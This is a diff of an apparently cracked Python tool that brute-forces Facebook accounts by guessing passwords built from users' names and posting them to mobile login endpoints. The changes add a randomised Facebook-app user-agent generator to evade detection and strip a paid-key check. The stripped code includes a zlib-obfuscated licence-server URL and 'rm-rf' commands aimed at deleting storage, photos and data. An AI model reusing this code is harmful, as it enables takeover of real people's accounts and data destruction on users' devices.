@@ -1,19 +1,9 @@
-# Open Source By SYED-ZADA
-
 from os import path
 from urllib.request import urlopen
 import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys
 import os,base64,zlib,pip,urllib
 os.system('xdg-open https://chat.whatsapp.com/G2UfzG9uqDgFVVVHXUYUln')
 print('\n\033[1;37m[-] CHECKING UPDATE')
-def getKey():
-    uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
-    id = "".join(uuidd).replace("_","").replace("360","JXB").replace("u","9").replace("a","A")
-    plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
-    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
-    bxd = "JXB-"
-    bumper = bxd+id+xp
-    return bumper
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -64,6 +54,14 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 
+def M1():
+	a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";"
+	net = random.choice(["Zong","Telenor","Jazz","Ufone","Warid"])
+	redmi = random.choice(['Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 10 5G','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2'])
+	b = random.choice(["[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/277740997;FBCR/Idea;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi_4;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621679;FBDM/{density=1.75,width=720,height=1423};FBLC/en_GB;FBRV/302569938;FBCR/Jio_4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660425;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/306637004;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2127;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400804;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2219;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279747;FBDM/{density=2.75,width=1080,height=2177};FBLC/en_US;FBRV/0;FBCR/IND_airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K6P;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233374;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/296244047;FBCR/Vodafone_IN;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1925;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"])
+	ua = a+b
+	return ua
+	
 logo=("""\033[1;37m
        dP dP     dP d888888P d888888P 
        88 88     88    88       88    \033[1;33mB\033[1;37m
@@ -108,20 +106,8 @@ def verf():
         sys.exit()
   
 def menu():
-        global lim,tp
-        if tp==0:
-            verf()
-        elif tp==1:
-            pass
-        else:
-            print("[+] Get approval first")
-            sys.exit()
-        try:
-                clear()
-                sn=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,O\xcc,.I\xcc\xc8,20\xd7K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd7\x07\t\xea\x16\xe4\x17\x97\xe8e\x94\xe4\xe6\x00\x008\x81\x13\x9a').decode()
-                sj=requests.get(sn).text
-                if "server on" in sj:
-                        #clear()
+        
+                        clear()
                         print("[1] File crack")
                         print("[2] Random crack")
                         print("[3] create file")
@@ -133,8 +119,7 @@ def menu():
                         linex()
                         xd=input('[?] Choose :')
                         if xd in ['1','01']:
-                                clear()
-                                verf()
+                                clear()                              
                                 file = input('[+] Put file->\033[1;37m: ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
@@ -233,56 +218,11 @@ def menu():
                                 exit(' THANKS FOR USE JXB TOOL ')
                         else:
                                 exit(' Select valid option .')                
-                else:
-                        print("\033[1;32m JXB SERVER IS OFF")
-                        os.system("rm-rf storage")
-                        os.system("rm-rf photos")
-                        os.system("rm-rf data")
-                        
-                        linex()
-                        exit()
-        except ValueError:
-                exit()
-        except requests.exceptions.ConnectionError:
-                print('\n No internet connection ...')
-                exit()
                 
-def za():
-    global tp
-    myid = getKey()
-    os.system(" clear ")
-    ux=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,O\xcc,.I\xcc\xc8,20\xd7K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd7\xcfN\xad4\xd2\xcb(\xc9\xcd\x01\x00\xd9\xb8\x11~').decode()
-    with urlopen(ux) as response:
-        body =response.read()
-    if myid in str(body):
-        tp=1
-        menu()
-    else:
-        tp=0
-        print(logo)
-        print("[+] Your key is not registered")
-        linex()
-        print("[+] This tool is paid ")
-        print("[+] Tool only for educationl purpose ")
-        linex()
-        print("[+] Your key : "+myid)
-        linex()
-        print("[+] Price 400 validity 1 month ")
-        print("[+] I will accept all types of  payment method like inr taka etc")
-        linex()
-        input("[+] press enter to send key")
-        linex();print("[+]You are not paid user ");linex()
-        url_wa = "https://api.whatsapp.com/send?phone=+923231243823&text="
-        name = input("[+] Type your name ")
-        tks = ("Hi AWAIS BRO I WANT TO BUY YOUR PAID TOOL V 7.2 PLEASE ACCEPT MY KEY FOR PREMIUM \nMy name : "+name+" \nMy Key : "+myid)
-        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-        print("\033[1;37m run again python JXB.py")
-
-        
+                      
 def pak():
                 user=[]
                 clear()
-                verf()
                 print('\033[1;31m[+] PAK CODE: 0306,0315,0335,0345')
                 print('\033[1;31m[+] BANGLADESH CODE: 016,017,018,019')
                 print('\033[1;31m[+] SAUDIA CODE : 059,056,053,054 etc')
@@ -343,7 +283,7 @@ def api(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': M1(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -384,7 +324,7 @@ def api1(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': M1(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -427,7 +367,7 @@ def graph(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': M1(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -468,7 +408,7 @@ def graph1(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': M1(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -606,7 +546,7 @@ def rndm(ids,passlist):
                                 'X-FB-Net-HNI': str(random.randint(20000,40000)),
                                 'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                                 'X-FB-Connection-Type':'MOBILE.LTE',
-                                'User-Agent':ua,
+                                'User-Agent':M1(),
                                 'Accept-Encoding':'gzip, deflate',
                                 'Connection': 'Keep-Alive',
                                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -643,7 +583,7 @@ def rndm(ids,passlist):
         except Exception as e:
                 pass
 try:
-    za()
+    menu()
 except requests.exceptions.ConnectionError:
         print('\n No internet connection ...')
         exit()
